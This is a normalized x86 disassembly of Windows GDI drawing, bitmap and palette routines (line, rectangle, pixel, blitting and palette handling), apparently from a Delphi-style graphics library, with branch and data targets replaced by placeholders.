call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
mov eax [ ebx + 0x14 ]
call sub_4242a4
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_42468c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4246ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_424718
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424750
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_424798
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4247d4
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4042c8
push eax
mov eax edi
call sub_4044c8
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_424818
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_4247d4
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_424834
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_4247d4
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_424854
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4248a0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4248a7
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_4246c4
sub_424900
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_424924
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_4246ec
pop ecx
pop edx
pop edi
pop esi
retn
sub_424944
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_424970
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_424a8c
mov eax [ ebp + 0x8 ]
call sub_4235e4
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4249d8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_424a38
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_4249d8
mov edx esp
mov eax ebx
call sub_424900
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_424924
sub_424a8c
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_424b28
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_4039c0
test bl 0x8
je r-xdata
mov eax esi
call sub_424b54
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_424b84
sub_424b28
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_423ab8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4235e4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_424b54
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_423fb8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_424b84
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_4242a4
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_4242a4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_424384
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_424268
call sub_4235e4
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_424268
call sub_4235e4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_424cb4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_424cfe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d05
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_424d08
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_424da4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_424cb4
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404278
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424dab
lea eax [ ebp - 0x104 ]
call sub_404008
retn
sub_424dc0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_424f0e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_424e7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_424d08
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_424d08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f15
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_424f20
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_424f54
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_424db0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4251d4
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424db0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4251db
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424db0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_425027
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406dcc
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4251db
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_4251e8
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_425220
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402c40
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_425298
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_4252f0
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_402998
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4253ed
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4253f4
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_425408
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42548e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_4254a0
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_402998
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_425298
mov eax esp
call sub_425408
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_425544
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_425298
mov [ esp ] eax
sub_425598
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424f40
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_424f20
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_425744
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424db0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42566a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_424dc0
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425671
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_424cb4
sub_425671
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424f40
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424db0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425724
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_424dc0
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42572b
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_425760
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_4257f0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407f70
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_425ae7
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_4258d9
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_424cb4
push 0x0
call GetDC
